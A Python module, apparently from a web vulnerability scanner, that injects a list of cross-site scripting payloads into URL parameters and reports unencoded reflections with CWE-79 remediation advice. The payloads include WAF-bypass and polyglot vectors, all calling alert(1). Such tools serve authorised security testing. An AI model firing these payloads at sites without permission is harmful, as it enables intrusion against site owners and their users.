"""
XSS Testing Module
Techniques: Reflected, DOM-based, Stored hints, WAF bypass payloads
"""

import re
import concurrent.futures
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from .utils import HTTPClient

XSS_PAYLOADS = [
    # Basic
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    # Attribute injection
    "\" onfocus=alert(1) autofocus=\"",
    "' onfocus=alert(1) autofocus='",
    "\" onmouseover=alert(1) \"",
    # HTML5 vectors
    "<details open ontoggle=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    # WAF bypass
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script>alert`1`</script>",
    "<<script>alert(1)//<</script>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    "javascript:alert(1)",
    "<a href=\"javascript:alert(1)\">click</a>",
    # Polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    # Context-specific
    "';alert(1)//",
    "\";alert(1)//",
    "</script><script>alert(1)</script>",
    "<img src=\"x\" onerror=\"alert(1)\">",
    # Encoded
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
]

MARKER = "XSS_TEST_42"

class XSSTester:
    def __init__(self, config):
        self.http    = HTTPClient(config)
        self.threads = config.get('threads', 20)
        self.results = []

    def run(self, target, urls):
        print(f"    [~] Testing {len(urls)} URLs for XSS...")
        endpoints = self._extract_params(urls, target)
        print(f"    [~] {len(endpoints)} param endpoints to test")

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = [ex.submit(self._test, ep) for ep in endpoints]
            for f in concurrent.futures.as_completed(futures):
                res = f.result()
                if res:
                    self.results.extend(res)
        return self.results

    def _extract_params(self, urls, target):
        endpoints = []
        base = f"https://{target}" if not target.startswith('http') else target
        for url in urls:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            for param, vals in qs.items():
                endpoints.append((url, param, vals[0] if vals else ''))
        if not endpoints:
            for p in ['q','search','query','s','name','input','data','value','text','msg','message','comment']:
                endpoints.append((f"{base}?{p}=test", p, 'test'))
        return endpoints

    def _test(self, endpoint):
        url, param, orig = endpoint
        findings = []
        for payload in XSS_PAYLOADS:
            injected = self._inject(url, param, payload)
            resp = self.http.get(injected)
            if not resp:
                continue
            # Check if payload is reflected unencoded
            if payload in resp.text or payload.lower() in resp.text.lower():
                # Verify it's not just escaped
                escaped = payload.replace('<', '&lt;').replace('>', '&gt;')
                if escaped not in resp.text:
                    print(f"    [VULN] XSS (Reflected) @ {url} param={param}")
                    findings.append({
                        'type':        'Cross-Site Scripting (XSS)',
                        'technique':   'Reflected XSS',
                        'url':         url,
                        'parameter':   param,
                        'payload':     payload,
                        'evidence':    'Payload reflected unencoded in response',
                        'severity':    'High',
                        'remediation': 'Encode output with context-aware encoding (HTML, JS, URL). Use CSP headers.',
                        'cvss':        '6.1',
                        'cwe':         'CWE-79',
                    })
                    break
        return findings

    def _inject(self, url, param, value):
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [value]
        return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
